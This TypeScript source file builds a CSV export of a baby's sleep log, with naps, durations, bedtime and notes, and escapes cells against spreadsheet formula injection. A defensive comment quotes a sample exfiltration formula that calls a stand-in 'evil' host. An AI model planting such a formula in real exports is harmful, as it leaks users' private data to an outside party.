import { parseHHMM, formatHHMM } from '$lib/time';
import type { Locale } from '$lib/server/auth/locale';
import * as m from '$paraglide/messages';

type Row = {
  date: string;
  wakeTime: string | null;
  nap1Start: string | null;
  nap1End: string | null;
  nap2Start: string | null;
  nap2End: string | null;
  nap3Start: string | null;
  nap3End: string | null;
  nap4Start: string | null;
  nap4End: string | null;
  nap5Start?: string | null;
  nap5End?: string | null;
  nap6Start?: string | null;
  nap6End?: string | null;
  nap7Start?: string | null;
  nap7End?: string | null;
  nap8Start?: string | null;
  nap8End?: string | null;
  nap1PauseMin?: number | null;
  nap2PauseMin?: number | null;
  nap3PauseMin?: number | null;
  nap4PauseMin?: number | null;
  nap5PauseMin?: number | null;
  nap6PauseMin?: number | null;
  nap7PauseMin?: number | null;
  nap8PauseMin?: number | null;
  bedtime: string | null;
  notes: string | null;
};

// CSV "formula injection" (CWE-1236): a cell that starts with `=`, `+`, `-`,
// `@`, TAB or CR is interpreted as a formula by Excel/LibreOffice when the
// file is opened. A note like `=HYPERLINK("http://evil/?x="&A1,"click")`
// would exfiltrate the row content the first time someone opens the export.
// Prefixing such cells with a single-quote forces the spreadsheet to treat
// them as literal text (the quote is consumed during display).
const FORMULA_CHARS = /^[=+\-@\t\r]/;

function escape(v: string | null | undefined): string {
  if (v == null) return '';
  const safe = FORMULA_CHARS.test(v) ? `'${v}` : v;
  if (/[";\r\n]/.test(safe)) return `"${safe.replace(/"/g, '""')}"`;
  return safe;
}

function napCount(r: Row): number {
  return [r.nap1End, r.nap2End, r.nap3End, r.nap4End, r.nap5End, r.nap6End, r.nap7End, r.nap8End]
    .filter(Boolean).length;
}

function napDur(start: string | null | undefined, end: string | null | undefined, pauseMin?: number | null): string {
  if (!start || !end || !/^\d{2}:\d{2}$/.test(start) || !/^\d{2}:\d{2}$/.test(end)) return '';
  const wall = ((parseHHMM(end) - parseHHMM(start)) % 1440 + 1440) % 1440;
  return formatHHMM(Math.max(0, wall - (pauseMin ?? 0)));
}

function napPause(pauseMin?: number | null): string {
  return pauseMin && pauseMin > 0 ? String(pauseMin) : '';
}

function totalDaySleep(r: Row): string {
  let total = 0;
  let hasAny = false;
  const triples: [string | null | undefined, string | null | undefined, number | null | undefined][] = [
    [r.nap1Start, r.nap1End, r.nap1PauseMin],
    [r.nap2Start, r.nap2End, r.nap2PauseMin],
    [r.nap3Start, r.nap3End, r.nap3PauseMin],
    [r.nap4Start, r.nap4End, r.nap4PauseMin],
    [r.nap5Start, r.nap5End, r.nap5PauseMin],
    [r.nap6Start, r.nap6End, r.nap6PauseMin],
    [r.nap7Start, r.nap7End, r.nap7PauseMin],
    [r.nap8Start, r.nap8End, r.nap8PauseMin]
  ];
  for (const [s, e, pause] of triples) {
    if (s && e && /^\d{2}:\d{2}$/.test(s) && /^\d{2}:\d{2}$/.test(e)) {
      const wall = ((parseHHMM(e) - parseHHMM(s)) % 1440 + 1440) % 1440;
      total += Math.max(0, wall - (pause ?? 0));
      hasAny = true;
    }
  }
  return hasAny ? formatHHMM(total) : '';
}

function durationPrevNight(curr: Row, prev: Row | null): string {
  if (!prev || !curr.wakeTime || !prev.bedtime) return '';
  const [y1, m1, d1] = curr.date.split('-').map(Number);
  const [y2, m2, d2] = prev.date.split('-').map(Number);
  const dayDiff = (Date.UTC(y1, m1 - 1, d1) - Date.UTC(y2, m2 - 1, d2)) / 86400000;
  if (dayDiff !== 1) return '';
  const dur = ((parseHHMM(curr.wakeTime) - parseHHMM(prev.bedtime)) % 1440 + 1440) % 1440;
  return formatHHMM(dur);
}

export function buildSleepCsv(
  rows: Row[],
  _babyName: string,
  locale: Locale,
  opts: { priorEntry?: Row | null } = {}
): string {
  // Pass `{ locale }` explicitly to every message call: the CSV builder runs
  // server-side but isn't always inside the Paraglide AsyncLocalStorage scope
  // (e.g. unit tests call it directly). Explicit locale = no global-state magic.
  const o = { locale };
  const napHeaders = (n: number) => [
    m.csv_header_nap_start({ n }, o),
    m.csv_header_nap_end({ n }, o),
    m.csv_header_nap_pause({ n }, o),
    m.csv_header_nap_duration({ n }, o)
  ];

  const sortedDesc = [...rows].sort((a, b) => (a.date < b.date ? 1 : a.date > b.date ? -1 : 0));
  const lines: string[] = [];
  lines.push([
    m.csv_header_date({}, o),
    m.csv_header_wake({}, o),
    ...napHeaders(1),
    ...napHeaders(2),
    ...napHeaders(3),
    ...napHeaders(4),
    ...napHeaders(5),
    ...napHeaders(6),
    ...napHeaders(7),
    ...napHeaders(8),
    m.csv_header_bedtime({}, o),
    m.csv_header_naps_count({}, o),
    m.csv_header_prev_night_duration({}, o),
    m.csv_header_day_duration({}, o),
    m.csv_header_notes({}, o)
  ].join(';'));
  for (let i = 0; i < sortedDesc.length; i++) {
    const cur = sortedDesc[i];
    const prev = sortedDesc[i + 1] ?? opts.priorEntry ?? null; // older date
    lines.push([
      escape(cur.date),
      escape(cur.wakeTime),
      escape(cur.nap1Start), escape(cur.nap1End), napPause(cur.nap1PauseMin), napDur(cur.nap1Start, cur.nap1End, cur.nap1PauseMin),
      escape(cur.nap2Start), escape(cur.nap2End), napPause(cur.nap2PauseMin), napDur(cur.nap2Start, cur.nap2End, cur.nap2PauseMin),
      escape(cur.nap3Start), escape(cur.nap3End), napPause(cur.nap3PauseMin), napDur(cur.nap3Start, cur.nap3End, cur.nap3PauseMin),
      escape(cur.nap4Start), escape(cur.nap4End), napPause(cur.nap4PauseMin), napDur(cur.nap4Start, cur.nap4End, cur.nap4PauseMin),
      escape(cur.nap5Start), escape(cur.nap5End), napPause(cur.nap5PauseMin), napDur(cur.nap5Start, cur.nap5End, cur.nap5PauseMin),
      escape(cur.nap6Start), escape(cur.nap6End), napPause(cur.nap6PauseMin), napDur(cur.nap6Start, cur.nap6End, cur.nap6PauseMin),
      escape(cur.nap7Start), escape(cur.nap7End), napPause(cur.nap7PauseMin), napDur(cur.nap7Start, cur.nap7End, cur.nap7PauseMin),
      escape(cur.nap8Start), escape(cur.nap8End), napPause(cur.nap8PauseMin), napDur(cur.nap8Start, cur.nap8End, cur.nap8PauseMin),
      escape(cur.bedtime),
      String(napCount(cur)),
      durationPrevNight(cur, prev),
      totalDaySleep(cur),
      escape(cur.notes)
    ].join(';'));
  }
  return '﻿' + lines.join('\r\n') + '\r\n';
}
